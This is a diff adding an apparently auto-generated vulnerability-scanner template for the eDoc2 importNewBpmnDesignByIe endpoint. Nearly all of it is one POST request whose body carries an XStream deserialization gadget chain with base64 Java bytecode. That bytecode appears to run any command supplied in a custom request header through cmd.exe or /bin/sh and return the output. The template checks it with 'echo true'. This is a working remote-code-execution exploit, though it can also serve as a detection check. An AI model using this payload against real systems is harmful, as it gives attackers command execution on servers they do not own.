@@ -1,0 +1,61 @@
+id: edoc2-importNewBpmnDesignByIe-xstream
+
+info:
+  name: edoc2-importNewBpmnDesignByIe-xstream
+  author: admin
+  severity: critical
+  description: edoc2-importNewBpmnDesignByIe-xstream
+  metadata:
+    max-request: 1
+    shodan-query: ""
+    verified: true
+  yakit-info:
+    sign: 261bcaf6b261f0075651c5bf55a3e818
+
+http:
+- method: POST
+  path:
+  - '{{RootURL}}/edoc2Flow-web/edoc-etc-processManage/importNewBpmnDesignByIe?groupId=1'
+  headers:
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+    Accept-Encoding: gzip, deflate, br
+    Accept-Language: zh-CN,zh;q=0.9
+    Connection: keep-alive
+    Content-Length: "9488"
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryJFHIXH91CoIqUMZk
+    Upgrade-Insecure-Requests: "1"
+    User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like
+      Gecko) Chrome/39.0.2171.71 Safari/537.36
+    giEltjaF: echo true
+  body: "------WebKitFormBoundaryJFHIXH91CoIqUMZk\r\nContent-Disposition: form-data;
+    name=\"file\";filename=\"aaa/1.html\"\r\n\r\n<linked-hash-set>\r\n  <dynamic-proxy>\r\n
+    \   <interface>map</interface>\r\n    <handler class='com.sun.corba.se.spi.orbutil.proxy.CompositeInvocationHandlerImpl'>\r\n
+    \     <classToInvocationHandler class='linked-hash-map'/>\r\n      <defaultHandler
+    class='sun.tracing.NullProvider'>\r\n        <active>true</active>\r\n        <providerType>java.lang.Object</providerType>\r\n
+    \       <probes>\r\n          <entry>\r\n            <method>\r\n              <class>java.lang.Object</class>\r\n
+    \             <name>hashCode</name>\r\n              <parameter-types/>\r\n            </method>\r\n
+    \           <sun.tracing.dtrace.DTraceProbe>\r\n              <proxy class='com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl'
+    serialization='custom'>\r\n                <com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl>\r\n
+    \                 <default>\r\n                    <__name>Pwnr</__name>\r\n                    <__bytecodes>\r\n
+    \                     <byte-array>yv66vgAAADIBQwEAH2NoL3Fvcy9sb2diYWNrL1ZpaU5xL1RocmVhZFV0aWwHAAEBABBqYXZhL2xhbmcvT2JqZWN0BwADAQACb2sBAAFaAQAGPGluaXQ+AQADKClWAQAeamF2YS9sYW5nL05vU3VjaEZpZWxkRXhjZXB0aW9uBwAJAQATamF2YS9sYW5nL1Rocm93YWJsZQcACwwABwAICgAEAA0MAAUABgkAAgAPAQAQamF2YS9sYW5nL1RocmVhZAcAEQEAEWdldEFsbFN0YWNrVHJhY2VzAQARKClMamF2YS91dGlsL01hcDsMABMAFAoAEgAVAQANamF2YS91dGlsL01hcAcAFwEABmtleVNldAEAESgpTGphdmEvdXRpbC9TZXQ7DAAZABoLABgAGwEADWphdmEvdXRpbC9TZXQHAB0BAAhpdGVyYXRvcgEAFigpTGphdmEvdXRpbC9JdGVyYXRvcjsMAB8AIAsAHgAhAQASamF2YS91dGlsL0l0ZXJhdG9yBwAjAQAHaGFzTmV4dAEAAygpWgwAJQAmCwAkACcBAARuZXh0AQAUKClMamF2YS9sYW5nL09iamVjdDsMACkAKgsAJAArAQAGdGFyZ2V0CAAtAQANZ2V0RmllbGRWYWx1ZQEAOChMamF2YS9sYW5nL09iamVjdDtMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9PYmplY3Q7DAAvADAKAAIAMQEABmhvbGRlcggAMwEABHRhc2sIADUBAAdnZXROYW1lAQAUKClMamF2YS9sYW5nL1N0cmluZzsMADcAOAoAEgA5AQAGUG9sbGVyCAA7AQAQamF2YS9sYW5nL1N0cmluZwcAPQEACGNvbnRhaW5zAQAbKExqYXZhL2xhbmcvQ2hhclNlcXVlbmNlOylaDAA/AEAKAD4AQQEACEFjY2VwdG9yCABDAQADYWpwCABFAQAGdGhpcyQwCABHAQAHaGFuZGxlcggASQEABmdsb2JhbAgASwEACGdldENsYXNzAQATKClMamF2YS9sYW5nL0NsYXNzOwwATQBOCgAEAE8BAA9qYXZhL2xhbmcvQ2xhc3MHAFEKAFIAOQEAGlRocmVhZFBvb2wkQ29udHJvbFJ1bm5hYmxlCABUAQAFdG9SdW4IAFYBAAhlbmRwb2ludAgAWAEACnByb2Nlc3NvcnMIAFoBAA5qYXZhL3V0aWwvTGlzdAcAXAsAXQAhAQAQd29ya2VyVGhyZWFkTmFtZQgAXwEADWN1cnJlbnRUaHJlYWQBABQoKUxqYXZhL2xhbmcvVGhyZWFkOwwAYQBiCgASAGMBAAZlcXVhbHMBABUoTGphdmEvbGFuZy9PYmplY3Q7KVoMAGUAZgoAPgBnAQADcmVxCABpAQAHZ2V0Tm90ZQgAawEAEWphdmEvbGFuZy9JbnRlZ2VyBwBtAQAEVFlQRQEAEUxqYXZhL2xhbmcvQ2xhc3M7DABvAHAJAG4AcQEAB3ZhbHVlT2YBABYoSSlMamF2YS9sYW5nL0ludGVnZXI7DABzAHQKAG4AdQEADGludm9rZU1ldGhvZAEAXShMamF2YS9sYW5nL09iamVjdDtMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9DbGFzcztbTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwwAdwB4CgACAHkBAAtnZXRSZXNwb25zZQgAewEADmdldERhdGFGcm9tUmVxAQAmKExqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL1N0cmluZzsMAH0AfgoAAgB/AQAHaXNFbXB0eQwAgQAmCgA+AIIBAAAIAIQBAANydW4BACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwwAhgCHCgACAIgBAA9nZXRFcnJvck1lc3NhZ2UBACkoTGphdmEvbGFuZy9UaHJvd2FibGU7KUxqYXZhL2xhbmcvU3RyaW5nOwwAigCLCgACAIwBAA9nZXRPdXRwdXRTdHJlYW0IAI4BABRqYXZhL2lvL091dHB1dFN0cmVhbQcAkAEACGdldEJ5dGVzAQAEKClbQgwAkgCTCgA+AJQBAAV3cml0ZQEABShbQilWDACWAJcKAJEAmAEABWZsdXNoDACaAAgKAJEAmwEABWNsb3NlDACdAAgKAJEAngEACWdldFdyaXRlcggAoAEAE2phdmEvaW8vUHJpbnRXcml0ZXIHAKIBABUoTGphdmEvbGFuZy9TdHJpbmc7KVYMAJYApAoAowClCgCjAJsKAKMAngEAE2phdmEvbGFuZy9FeGNlcHRpb24HAKkBAAxnZXRQYXJhbWV0ZXIIAKsBAAhnaUVsdGphRggArQEACWdldEhlYWRlcggArwEAB29zLm5hbWUIALEBABBqYXZhL2xhbmcvU3lzdGVtBwCzAQALZ2V0UHJvcGVydHkMALUAhwoAtAC2AQALdG9Mb3dlckNhc2UMALgAOAoAPgC5AQAGd2luZG93CAC7AQAHY21kLmV4ZQgAvQEAAi9jCAC/AQATW0xqYXZhL2xhbmcvU3RyaW5nOwcAwQEABy9iaW4vc2gIAMMBAAItYwgAxQEACyJ7Y29tbWFuZH0iCADHAQADXHMrCADJAQAFc3BsaXQBACcoTGphdmEvbGFuZy9TdHJpbmc7KVtMamF2YS9sYW5nL1N0cmluZzsMAMsAzAoAPgDNAQAHcmVwbGFjZQEARChMamF2YS9sYW5nL0NoYXJTZXF1ZW5jZTtMamF2YS9sYW5nL0NoYXJTZXF1ZW5jZTspTGphdmEvbGFuZy9TdHJpbmc7DADPANAKAD4A0QEACXtjb21tYW5kfQgA0wEAGGphdmEvbGFuZy9Qcm9jZXNzQnVpbGRlcgcA1QEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYMAAcA1woA1gDYAQATcmVkaXJlY3RFcnJvclN0cmVhbQEAHShaKUxqYXZhL2xhbmcvUHJvY2Vzc0J1aWxkZXI7DADaANsKANYA3AEABXN0YXJ0AQAVKClMamF2YS9sYW5nL1Byb2Nlc3M7DADeAN8KANYA4AEAEWphdmEvdXRpbC9TY2FubmVyBwDiAQARamF2YS9sYW5nL1Byb2Nlc3MHAOQBAA5nZXRJbnB1dFN0cmVhbQEAFygpTGphdmEvaW8vSW5wdXRTdHJlYW07DADmAOcKAOUA6AEAGChMamF2YS9pby9JbnB1dFN0cmVhbTspVgwABwDqCgDjAOsBAAJcQQgA7QEADHVzZURlbGltaXRlcgEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvdXRpbC9TY2FubmVyOwwA7wDwCgDjAPEMACkAOAoA4wDzAQBgKExqYXZhL2xhbmcvT2JqZWN0O0xqYXZhL2xhbmcvU3RyaW5nO1tMamF2YS9sYW5nL0NsYXNzPCo+O1tMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQAfamF2YS9sYW5nL05vU3VjaE1ldGhvZEV4Y2VwdGlvbgcA9gEAGGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZAcA+AEAEWdldERlY2xhcmVkTWV0aG9kAQBAKExqYXZhL2xhbmcvU3RyaW5nO1tMamF2YS9sYW5nL0NsYXNzOylMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwwA+gD7CgBSAPwBAA1nZXRTdXBlcmNsYXNzDAD+AE4KAFIA/wEAF2phdmEvbGFuZy9TdHJpbmdCdWlsZGVyBwEBCgECAA0BAAZhcHBlbmQBAC0oTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsMAQQBBQoBAgEGAQATIE1ldGhvZCBub3QgZm91bmQ6IAgBCAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOwwBBAEKCgECAQsBAAh0b1N0cmluZwwBDQA4CgECAQ4MAAcApAoA9wEQAQANc2V0QWNjZXNzaWJsZQEABChaKVYMARIBEwoA+QEUAQASW0xqYXZhL2xhbmcvQ2xhc3M7BwEWAQATW0xqYXZhL2xhbmcvT2JqZWN0OwcBGAEABmludm9rZQEAOShMamF2YS9sYW5nL09iamVjdDtbTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwwBGgEbCgD5ARwBABBnZXREZWNsYXJlZEZpZWxkAQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL3JlZmxlY3QvRmllbGQ7DAEeAR8KAFIBIAEAF2phdmEvbGFuZy9yZWZsZWN0L0ZpZWxkBwEiCgEjARQBAANnZXQBACYoTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwwBJQEmCgEjAScBABIgRmllbGQgbm90IGZvdW5kOiAIASkKAAoBEAEAHWphdmEvaW8vQnl0ZUFycmF5T3V0cHV0U3RyZWFtBwEsCgEtAA0BABNqYXZhL2lvL1ByaW50U3RyZWFtBwEvAQAZKExqYXZhL2lvL091dHB1dFN0cmVhbTspVgwABwExCgEwATIBAA9wcmludFN0YWNrVHJhY2UBABgoTGphdmEvaW8vUHJpbnRTdHJlYW07KVYMATQBNQoADAE2CgEtAQ4K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</byte-array>\r\n
+    \                   </__bytecodes>\r\n                    <__transletIndex>-1</__transletIndex>\r\n
+    \                   <__indentNumber>0</__indentNumber>\r\n                  </default>\r\n<boolean>false</boolean>\r\n
+    \               </com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl>\r\n
+    \             </proxy>\r\n              <implementing__method>\r\n                <class>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</class>\r\n
+    \               <name>getOutputProperties</name>\r\n                <parameter-types/>\r\n
+    \             </implementing__method>\r\n            </sun.tracing.dtrace.DTraceProbe>\r\n
+    \         </entry>\r\n        </probes>\r\n      </defaultHandler>\r\n    </handler>\r\n
+    \ </dynamic-proxy>\r\n</linked-hash-set>\r\n------WebKitFormBoundaryJFHIXH91CoIqUMZk--"
+
+  max-redirects: 3
+  disable-cookie: true
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - "true"
+    condition: and
+
+
+# Generated From WebFuzzer on 2026-01-07 17:18:14
